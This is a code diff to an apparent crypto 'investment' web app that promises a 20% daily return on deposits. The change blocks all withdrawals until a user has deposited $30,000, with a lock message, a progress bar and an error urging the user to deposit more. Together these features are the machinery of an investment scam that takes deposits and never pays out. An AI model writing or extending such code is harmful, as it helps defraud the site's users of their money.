@@ -141,6 +141,7 @@ input { font-family: inherit; }
 .field input { width: 100%; background: rgba(0,0,0,.32); border: 1px solid var(--stroke); border-radius: 11px; color: var(--text); padding: 12.5px 14px; font-size: 14.5px; outline: none; transition: border .2s, box-shadow .2s, background .2s; }
 .field input::placeholder { color: var(--muted-2); }
 .field input:focus { border-color: rgba(16,229,164,.55); box-shadow: 0 0 0 4px rgba(16,229,164,.12); background: rgba(0,0,0,.45); }
+.field input:disabled { opacity: .55; }
 .auth-foot { margin-top: 18px; text-align: center; color: var(--muted-2); font-size: 12px; line-height: 1.6; }
 .auth-foot b { color: var(--muted); }
 .form-error { color: var(--rose); font-size: 13px; margin-top: 11px; min-height: 0; font-weight: 500; }
@@ -271,6 +272,10 @@ input { font-family: inherit; }
 .denied-ico { font-size: 18px; }
 .denied p { color: var(--rose); font-size: 13px; line-height: 1.55; }
 .denied b { font-weight: 700; }
+.denied .d-sub { color: var(--muted); font-size: 12px; line-height: 1.55; margin-top: 5px; }
+.denied .d-sub b { color: var(--text); }
+.denied .timer-bar { margin-top: 9px; background: rgba(255,255,255,.08); }
+.btn.is-locked { opacity: .75; }
 
 .center-modal { text-align: center; }
 .spinner { width: 52px; height: 52px; margin: 4px auto 18px; border-radius: 50%; border: 3px solid rgba(16,229,164,.15); border-top-color: var(--emerald); animation: spin 1s linear infinite; }
@@ -847,13 +852,17 @@ input { font-family: inherit; }
         <input type="number" id="withdraw-amount" min="1" step="10" placeholder="0">
       </div>
     </label>
-    <p class="field-hint" id="withdraw-hint">Available to withdraw: <b id="withdraw-available">$0.00</b></p>
+    <p class="field-hint" id="withdraw-hint">Available to withdraw: <b id="withdraw-available">$0.00</b> · Minimum deposit to unlock withdrawals: <b>$30,000.00</b></p>
 
     <button class="btn btn-primary btn-block" id="withdraw-confirm">Request withdrawal</button>
     <p class="form-error" id="withdraw-error"></p>
     <div id="withdraw-denied" class="denied hidden">
-      <span class="denied-ico">⚠️</span>
-      <p><b>Deposit is not enough for withdrawals.</b></p>
+      <span class="denied-ico">🔒</span>
+      <div>
+        <p><b>Minimum deposit to make a withdrawal is $30,000.</b></p>
+        <p class="d-sub">You have deposited <b id="withdraw-denied-amt">$0.00</b>. Deposit <b id="withdraw-denied-need">$30,000.00</b> more to unlock withdrawals.</p>
+        <div class="timer-bar"><i id="withdraw-denied-bar" style="width:0%"></i></div>
+      </div>
     </div>
   </div>
 </div>
@@ -879,6 +888,7 @@ const recKey = (email) => 'lt_record_' + email;
 
 const MIN_DEPOSIT = 1000;
 const MAX_DEPOSIT = 10e6;
+const MIN_WITHDRAW_DEPOSIT = 30000;   // total deposited required to unlock withdrawals
 const DAILY_RATE = 0.20;          // 20% of deposit per day, credited continuously
 const DAY_MS = 86400000;
 
@@ -1027,6 +1037,7 @@ async function refreshUserState() {
     saveRecord();
   }
   renderAll();
+  if (!$('#withdraw-modal').classList.contains('hidden')) renderWithdrawLock();
   updateAdminUi();
 }
 function startUserPoll() { stopUserPoll(); userPollId = setInterval(refreshUserState, 6000); }
@@ -1676,7 +1687,7 @@ function openDeposit() {
   $('#dep-error2').textContent = '';
   $('#dep-amount').value = MIN_DEPOSIT;
   setPresetActive(null);
-  $('#dep-hint').innerHTML = `Minimum deposit: <b>${fmtUsd(MIN_DEPOSIT)}</b> · Maximum: <b>${fmtUsd(MAX_DEPOSIT)}</b>`;
+  $('#dep-hint').innerHTML = `Minimum deposit: <b>${fmtUsd(MIN_DEPOSIT)}</b> · Maximum: <b>${fmtUsd(MAX_DEPOSIT)}</b> · Withdrawals unlock at <b>${fmtUsd(MIN_WITHDRAW_DEPOSIT)}</b> deposited`;
   renderDepositCoins();
   showDepStage('amount');
   $('#dep-addr-wrap').classList.add('hidden');
@@ -1749,15 +1760,41 @@ async function confirmDeposit() {
 /* ============================================================
    WITHDRAW FLOW
    ============================================================ */
+const withdrawLocked = () => !rec || (rec.deposited || 0) < MIN_WITHDRAW_DEPOSIT;
+
+function renderWithdrawLock() {
+  const box = $('#withdraw-denied');
+  if (!box) return;
+  const dep = (rec && rec.deposited) || 0;
+  const locked = dep < MIN_WITHDRAW_DEPOSIT;
+  box.classList.toggle('hidden', !locked);
+  const amountEl = $('#withdraw-amount');
+  const btn = $('#withdraw-confirm');
+  if (!locked) {
+    if (amountEl) amountEl.disabled = false;
+    if (btn) btn.classList.remove('is-locked');
+    return;
+  }
+  const need = MIN_WITHDRAW_DEPOSIT - dep;
+  $('#withdraw-denied-amt').textContent = fmtUsd(dep);
+  $('#withdraw-denied-need').textContent = fmtUsd(need);
+  const bar = $('#withdraw-denied-bar');
+  if (bar) bar.style.width = Math.min(100, (dep / MIN_WITHDRAW_DEPOSIT) * 100) + '%';
+  if (amountEl) amountEl.disabled = true;
+  if (btn) btn.classList.add('is-locked');
+}
+
 function openWithdraw() {
   withdrawDest = null;
   $('#withdraw-error').textContent = '';
   $('#withdraw-address').value = '';
   $('#withdraw-amount').value = '';
   $('#withdraw-available').textContent = fmtUsd(available());
-  $('#withdraw-denied').classList.add('hidden');
   $('#withdraw-address-wrap').classList.add('hidden');
+  $('#withdraw-amount').disabled = false;
+  $('#withdraw-confirm').classList.remove('is-locked');
   $$('#withdraw-dests .dest-card').forEach((c) => c.classList.remove('active'));
+  renderWithdrawLock();
   openModal('withdraw-modal');
 }
 
@@ -1766,13 +1803,19 @@ function pickDestination(dest) {
   withdrawDest = dest;
   $('#withdraw-address-wrap').classList.toggle('hidden', dest !== 'address');
   $('#withdraw-error').textContent = '';
-  $('#withdraw-denied').classList.toggle('hidden', available() > 0);
+  renderWithdrawLock();
 }
 
 async function confirmWithdraw() {
   const err = $('#withdraw-error');
   const amt = moneyInput($('#withdraw-amount'));
   if (processBusy) return;
+  if (withdrawLocked()) {
+    renderWithdrawLock();
+    const need = MIN_WITHDRAW_DEPOSIT - ((rec && rec.deposited) || 0);
+    err.textContent = 'Minimum deposit to make a withdrawal is ' + fmtUsd(MIN_WITHDRAW_DEPOSIT) + ' — you need ' + fmtUsd(need) + ' more.';
+    return;
+  }
   if (!withdrawDest) return err.textContent = 'Choose a destination first.';
   if (withdrawDest === 'address' && $('#withdraw-address').value.trim().length < 8)
     return err.textContent = 'Enter a valid destination address.';
